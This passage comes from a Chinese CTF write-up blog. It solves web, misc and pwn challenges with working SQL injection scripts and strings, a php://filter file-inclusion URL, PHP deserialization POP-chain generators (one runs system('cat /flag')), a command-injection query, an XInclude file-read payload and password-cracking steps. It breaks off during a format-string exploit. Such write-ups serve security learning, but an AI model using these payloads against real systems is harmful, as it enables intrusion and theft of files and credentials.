        if tmp!=&quot;&quot; and tmp[-1]==&quot;~&quot;:
            tmp=tmp[:-1] 
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        time.sleep(0.5)
    print(result)
sql_inj(&quot;select(group_concat(load_file(0x2f6574632f706173737764)))&quot;)
</code></pre>
<pre><code>article,flag,users
flag
title,content
name,pwd,email,real_flag_1s_here</code></pre><p><code>flag{9b73df68-406f-439e-9076-c9a9f37f5255}</code></p>
<p>二次注入</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>easy</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>后缀名限制:php</p>
<p>上传htaccess+图片马</p>
<p><code>flag{c4ab5af4-4cb4-45bf-9cb3-ebe35922eca9}</code></p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>修改xff头</p>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>测试发现</p>
<pre><code>Warning: include(meowers&#39;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening &#39;meowers&#39;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>index.php</p>
<pre><code class="php">&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;
    &lt;title&gt;Had a bad day?&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;
      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;
        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;
          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;
          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;
        &lt;div&gt;
      &lt;/header&gt;
      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;
      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;
        &lt;div class=&quot;page-container mdl-grid&quot;&gt;
          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;
          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;
            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;
            &lt;/div&gt;
            &lt;h3&gt;Cheer up!&lt;/h3&gt;
              &lt;p&gt;
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              &lt;/p&gt;
              &lt;div class=&quot;page-include&quot;&gt;
              &lt;?php
                $file = $_GET[&#39;category&#39;];

                if(isset($file))
                {
                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){
                        include ($file . &#39;.php&#39;);
                    }
                    else{
                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
                    }
                }
                ?&gt;
            &lt;/div&gt;
          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;
              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
              &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
          &lt;/form&gt;

          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/main&gt;
    &lt;/div&gt;
    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>在扫目录时发现flag.php</p>
<p><code>http://12d20382-ff0d-44bf-abfd-50a08a5b8604.node3.buuoj.cn/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre><code class="php">&lt;?php
error_reporting(0);

if (isset($_GET[&#39;source&#39;])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    &#39;\.\.&#39;,
    // no stream wrapper
    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,
    // no data exfiltration
    &#39;flag&#39;
  ];
  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents(&#39;php://input&#39;);
$json = json_decode($body, true);

if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) {
  $page = $json[&#39;page&#39;];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;
  }
} else {
  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;
}

// no data exfiltration!!!
$content = preg_replace(&#39;/HarekazeCTF\{.+\}/i&#39;, &#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;, $content);
echo json_encode([&#39;content&#39; =&gt; $content]);</code></pre>
<p>学到了学到了</p>
<p>json_decode在解析类似<code>\u0020</code>的时候会把他当成一个unicode字符,也就是说它会变成<code>空格</code></p>
<p>这个在官方文档里也有涉及<code>PHP implements a superset of JSON as specified in the original » RFC 7159.</code></p>
<p>去查RFC 7159就会发现</p>
<blockquote>
<pre><code>  Any character may be escaped.  If the character is in the Basic
  Multilingual Plane (U+0000 through U+FFFF), then it may be
  represented as a six-character sequence: a reverse solidus, followed
  by the lowercase letter u, followed by four hexadecimal digits that
  encode the character&#39;s code point.  The hexadecimal letters A though
  F can be upper or lower case.  So, for example, a string containing
  only a single reverse solidus character may be represented as
  &quot;\u005C&quot;.</code></pre></blockquote>
<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><pre><code class="php">&lt;?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request-&gt;input(&quot;payload&quot;);
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}</code></pre>
<p>很明显是要让我们找个pop链,刚开始我天真的以为可以直接用cve的,一行注释让我明白了我的天真</p>
<p><img src="https://i.loli.net/2020/04/16/OFIVpwyUmARvcdE.png" alt="image55205"></p>
<p>这个pop链显然要从<code>__destruct</code>开始</p>
<p><img src="https://i.loli.net/2020/04/16/qu6dkEK9UMVw2IQ.png" alt="image55300"></p>
<p><img src="https://i.loli.net/2020/04/16/of6Vy52wIlsvBgQ.png" alt="image55369"></p>
<p>在经过一番搜索+wp观看大法后,我找到了</p>
<p>这里有个<code>$f($items)</code>,可以直接命令执行,前提是没有直接从<code>foreach</code>那里退出</p>
<p>不知道为啥,本机不可以,而靶场可以???</p>
<pre><code class="php">&lt;?php

namespace Symfony\Component\Cache\Adapter;

class TagAwareAdapter{
    private $deferred;
    private $getTagsByKey;
    function __construct(){
        $this-&gt;deferred=&quot;cat /flag&quot;;
        $this-&gt;getTagsByKey=&quot;system&quot;;
    }
}



$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter();
echo urlencode(serialize($a));</code></pre>
<p><code>flag{d5b22868-43a5-4784-be2f-6021702cfe89}</code></p>
<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>2333333333</p>
<p><code>flag{b84a1566-98fb-43aa-967d-95b86c42da14}</code></p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre><code class="php">&lt;?php
class Modifier {
    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Show{
    public $source;
    public $str;

    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = new Modifier();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}
$a=new Show();
$b=new Show();
$b-&gt;str=new Test();
$a-&gt;source=$b;
echo urlencode(serialize($a));
?&gt;</code></pre>
<p><code>flag{ff09736d-ed1f-4089-8906-3379cbb7e019}</code></p>
<h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><code>UpdateHelper(__destruct)-&gt;User(__toString)-&gt;Info(__call)-&gt;dbCtrl(login)</code></p>
<pre><code class="php">&lt;?php
function safe($parm){
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
}
class User
{
    public $id=1;
    public $age;
    public $nickname;
    public function __construct(){
        $this-&gt;nickname=new Info();
        $this-&gt;age=&quot;UPDATE user SET password=\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; where username=?&quot;;
    } 


}
class dbCtrl
{
    public $hostname=&quot;127.0.0.1&quot;;
    public $dbuser=&quot;root&quot;;
    public $dbpass=&quot;root&quot;;
    public $database=&quot;test&quot;;
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this-&gt;name=&#39;admin&#39;;
        $this-&gt;password=&#39;1&#39;;
        $this-&gt;token=&#39;admin&#39;;
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct(){
        $this-&gt;age=&quot;&quot;;
        $this-&gt;nickname=&quot;&quot;;
        $this-&gt;CtrlCase=new dbCtrl();
    }
}
Class UpdateHelper{
    public $id=&quot;&quot;;
    public $newinfo=&quot;&quot;;
    public $sql=&quot;&quot;;
    public function __construct(){
        $this-&gt;sql=new User();
    }
}

$nickname=&quot;&quot;;
$a=new User();
$evil=str_replace(&quot;flag&quot;,&quot;alag&quot;,serialize($a));

#echo $evil;
$age=&#39;&quot;;s:8:&quot;nickname&quot;;&#39;.$evil.&#39;s:8:&quot;CtrlCase&quot;;N;};&#39;;
$len=strlen($age);
for($i=0;$i&lt;$len;$i++){
    $age=&quot;union&quot;.$age;
};
$tmp=serialize(new Info($age,$nickname));
$result=safe($tmp);
echo $age;
unserialize($result);
?&gt;


</code></pre>
<p><code>flag{be7c6d56-1969-47d8-8eed-e672e5496d25}</code></p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><pre><code>0/**/uniunionon/**/select/**/1,2,3#
0/**/uniunionon/**/select/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables/**/where/**/TABLE_SCHEMA=database()#
flag,score
0/**/uniunionon/**/select/**/1,GROUP_CONCAT(column_name),3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#39;flag&#39;#
flag,value </code></pre><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>在robots.txt中发现fAke_f1agggg.php</p>
<p>在fAke_f1agggg.php中发现fl4g.php</p>
<pre><code class="php">&lt;img src=&quot;/img.jpg&quot;&gt;
&lt;?php
header(&#39;Content-type:text/html;charset=utf-8&#39;);
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){
        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;
    }else{
        die(&quot;金钱解决不了穷人的本质问题&quot;);
    }
}else{
    die(&quot;去非洲吧&quot;);
}
//level 2
if (isset($_GET[&#39;md5&#39;])){
   $md5=$_GET[&#39;md5&#39;];
   if ($md5==md5($md5))
       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;
   else
       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);
}else{
    die(&quot;去非洲吧&quot;);
}

//get flag
if (isset($_GET[&#39;get_flag&#39;])){
    $get_flag = $_GET[&#39;get_flag&#39;];
    if(!strstr($get_flag,&quot; &quot;)){
        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);
        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;
        system($get_flag);
    }else{
        die(&quot;快到非洲了&quot;);
    }
}else{
    die(&quot;去非洲吧&quot;);
}
?&gt;</code></pre>
<pre><code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=a%3dc%26%26b%3da%26%26c%3dt%26%26$a$b$c%09*</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/05/4月做题/">http://blog.ccreater.top/2020/05/05/4月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cka3ckr4j006vv4v052av6v5g" data-title="4月做题" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-byb2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/20/byb2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-20T12:51:36.059Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/20/byb2019/">百越杯2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p>
<p>base64decode </p>
<p><code>please submit: flag{hello_byb}</code></p>
<h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>下载附件,用photoshop放大查看,有一条奇奇怪怪的钥匙</p>
<p>用hxd打开图片在图片末尾找到KEY:ISEEU!</p>
<p>提取钥匙中特殊颜色的RGB值与key循环异或</p>
<pre><code>2f3f24
222e13
7f6624
713645
7b7e27
723310
646721
76670c
703723
727816
7a6020
213345
7b3277
74375c</code></pre><pre><code class="python">rgb=[&#39;2f&#39;,&#39;3f&#39;,&#39;24&#39;,&#39;22&#39;,&#39;2e&#39;,&#39;13&#39;,&#39;7f&#39;,&#39;66&#39;,&#39;24&#39;,&#39;71&#39;,&#39;36&#39;,&#39;45&#39;,&#39;7b&#39;,&#39;7e&#39;,&#39;27&#39;,&#39;72&#39;,&#39;33&#39;,&#39;10&#39;,&#39;64&#39;,&#39;67&#39;,&#39;21&#39;,&#39;76&#39;,&#39;67&#39;,&#39;0c&#39;,&#39;70&#39;,&#39;37&#39;,&#39;23&#39;,&#39;72&#39;,&#39;78&#39;,&#39;16&#39;,&#39;7a&#39;,&#39;60&#39;,&#39;20&#39;,&#39;21&#39;,&#39;33&#39; ,&#39;45&#39;,&#39;7b&#39;,&#39;32&#39;,&#39;77&#39;,&#39;74&#39;,&#39;37&#39;,&#39;5c&#39;]

key=&quot;ISEEU!&quot;
j=0
for i in rgb:
    print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;)
    j+=1
    j%=6</code></pre>
<p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p>
<h3 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h3><p>下载附件得到ori.jpg和102%</p>
<p>用hxd打开后发现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p>
<p>这是一张png图片但是文件头错了</p>
<p>划到最后面发现PK</p>
<p>图片里面又藏在压缩包,搜索IEND找到png的最后一个数据块(别问我为啥不用foremost,谁用谁知道)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p>
<p>又是一个魔改的文件头(正常zip文件头 504B0304 ),手动分离得到zip</p>
<p>emmmm需要密码</p>
<p>用stegsolve发现分离出来的png里藏着二维码</p>
<p>猜测做了蒙版处理</p>
<p>打开ps一段猛如虎()(自闭)的操作后,手动拼接出了二维码</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p>
<p>得到压缩包密码1tsEz_b14ndVV4t3rM4k</p>
<p>解压得到两张图片</p>
<p>用beyondcompare得到flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p>
<p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p>
<h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>下载得到readme和一个流量</p>
<p>readme</p>
<pre><code>已知密码格式是6666xxxx</code></pre><p>原本试着生成一个所有可打印字符的密码,但是这个也要500m+</p>
<p>所以先用纯数字密码试试</p>
<pre><code class="python">f=open(&quot;dict.txt&quot;,&quot;w&quot;)
for i in range(10**4):
    f.write(&quot;6666%04d\n&quot;%i)
f.close()</code></pre>
<p>用kali的<code>aircrack-ng</code> 来破解通信内容</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p>
<p>flag{0566668912-f059-448f}</p>
<p>幸亏没有直接爆所有可打印字符</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code class="php">&lt;?php
error_reporting(1);
class Read {
    private $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }

    public function __invoke(){
        $content = $this-&gt;file_get($this-&gt;var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;)
    {
        $this-&gt;source = $file;
        echo $this-&gt;source.&#39;瑙ｆ瀽寮€濮�&#39;.&quot;&lt;br&gt;&quot;;
    }

    public function __toString()
    {

        $this-&gt;str[&#39;str&#39;]-&gt;source;
    }

    public function _show()
    {

        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {
            die(&#39;hacker!&#39;);
        } else {
            highlight_file($this-&gt;source);
        }

    }

    public function __wakeup()
    {
        print(&quot;step1&quot;);
        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker~&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}

class Test
{
    public $params;
    public function __construct()
    {
        $this-&gt;params = array();
    }

    public function __get($key)
    {
        $func = $this-&gt;params;
        return $func();
    }  
}

if(isset($_GET[&#39;chal&#39;]))
{
    $chal = unserialize($_GET[&#39;chal&#39;]);
}
else
{
    $show = new Show(&#39;index.php&#39;);
    $show-&gt;_show();
}
?&gt;</code></pre>
<p>%100反序列化链构造</p>
<ol>
<li><p><code>Show::__wake</code>是唯一可以入手的地方</p>
</li>
<li><p>在这个方法中只有$this-&gt;source可以构造pop链的连接点</p>
</li>
</ol>
<p>阅读代码发现<code>Show::__toString</code>会被<code>if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>调用</p>
<ol start="3">
<li><code>Show::__toString</code>:  $this-&gt;str[‘str’]-&gt;source和<code>Test::__get</code>构成链接点</li>
<li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>和<code>Read::__invoke</code>构成链接点</li>
<li>而Read()可以任意读取文件</li>
</ol>
<p>payload生成:</p>
<pre><code class="php">&lt;?php
class Show
{
    public $source;
    public $str;
    public function __construct($file=&quot;&quot;)
    {

    }
    public function _show()
    {
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {
            die(&#39;hacker!&#39;);
        } else {
            highlight_file($this-&gt;source);
        }

    }

    public function __wakeup()
    {
    }
}
class Read {
    private $var=&quot;fllllllaaaaaag.php&quot;;

    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }

    public function __invoke(){
        $content = $this-&gt;file_get($this-&gt;var);
        echo $content;
    }
}
class Test
{
    public $params;
    private $source=&quot;666&quot;;
    public function __construct()
    {
    }
    public function __get($key)
    {
        $func = $this-&gt;params;
        return $func();
    }  
}

$a=new Show();
$b=new Show();
$c=new Test;
//$s-&gt;str[&quot;str&quot;] = $t;

//Read::__invoke
$c-&gt;params=new Read;

//Test::__get
$b-&gt;str[&#39;str&#39;]=$c;

//Show::__tostring
$a-&gt;source=$b;

print(urlencode(serialize($a)));
?&gt;</code></pre>
<p>最后一步就剩flag的文件名,从正则中抠出<code>fllllllaaaaaag</code>但是直接读取,网页500,是文件不存在的结果</p>
<p>一番尝试后flag的文件名<code>fllllllaaaaaag.php</code></p>
<pre><code>&lt;?php
$flag = &quot;flag{df210681-fb10-4c0f-ba25-1f678eb38f85}&quot;;
?&gt;</code></pre><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>文件树</p>
<pre><code>index.html
tools.php?hash=
manage.php?showuer
            register
            login
            msgid=1
</code></pre><p>index.html</p>
<p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p>
<p>flag生成方式</p>
<p><code>flag{md5(name . md5(pass))}</code></p>
<p>网站存在两个cookie: __jsluid_h , PHPSESSID </p>
<p>约束攻击生效,但是无法拿到flag</p>
<p>二次注入测试逃逸引号</p>
<p>宽字节x=&gt;正常回显</p>
<p>%00x=&gt;\0</p>
<p>出现需要转义的地方没有假flag</p>
<p><code>a&#39;#</code>没有flag</p>
<p><code>a\&#39;#</code>出现flag,md5为<code>flag{md5(&quot;a\\\&#39;&quot; . md5(pass))}</code></p>
<p>而直接<code>b\&#39;#</code>是没有flag的,而且与#无关</p>
<p>判断用户时候存在再给一个flag链接</p>
<pre><code>a\\\&#39;#=&gt;a\&#39;#=&gt;select * from xx where user=&#39;$user&#39;?

a\&#39;=&gt;a&#39;,用户不存在

猜测</code></pre><p><code>c\&#39;#</code>=&gt;no flag</p>
<p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>出现flag(得删除cookie)</p>
<p>注入点就在这</p>
<p>什么代码导致这种结果</p>
<p>登陆时:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p>
<p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p>
<pre><code>user    php($_SESSION) mysql(&#39;$sql&#39;)
a&#39;        a&#39;             a&#39;
a\&#39;        a\&#39;         a\&#39;

</code></pre><p>存在过滤?</p>
<p>依据个数生成flag链接</p>
<p>后面想到为啥注入点不可以是msgid呢</p>
<p>约束攻击获得一个只带有<code>\</code>的账号</p>
<p>注册一个a+’ ‘*28+’”‘ 的账号</p>
<p>msgid处出现注入点</p>
<p><code>or 1%23</code>成功</p>
<p>用sqlmap爆破得到admin的密码拿到tools.php解密得到:<code>ChunQiuGame</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p>
<p>正常的xxe没啥用,找到一叶飘零的一篇文章</p>
<p><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p>
<p>payload:</p>
<pre><code>&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
 &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;
&lt;/root&gt;</code></pre><p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p>
<p>………………..气死了就差一点拿到flag</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.tw原题魔改，<code>bss</code>没有<code>stdin</code>,<code>stdout</code>,<code>stderr</code>了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把<code>stdout</code>的<code>fileno</code>改为<code>2</code>，就可以绕过<code>close(1)</code>了<br>而且刚好</p>
<pre><code class="asm"> ► 0x40089f &lt;func1+57&gt;    mov    eax, 0
   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;

   0x4008a9 &lt;func1+67&gt;    mov    eax, 0
   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]
   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]
   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;

   0x4008bd &lt;func1+87&gt;    call   0x400648

   0x4008c2 &lt;func1+92&gt;    leave  
   0x4008c3 &lt;func1+93&gt;    ret    

   0x4008c4 &lt;main&gt;        push   rbp
   0x4008c5 &lt;main+1&gt;      mov    rbp, rsp
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff
02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087</code></pre>
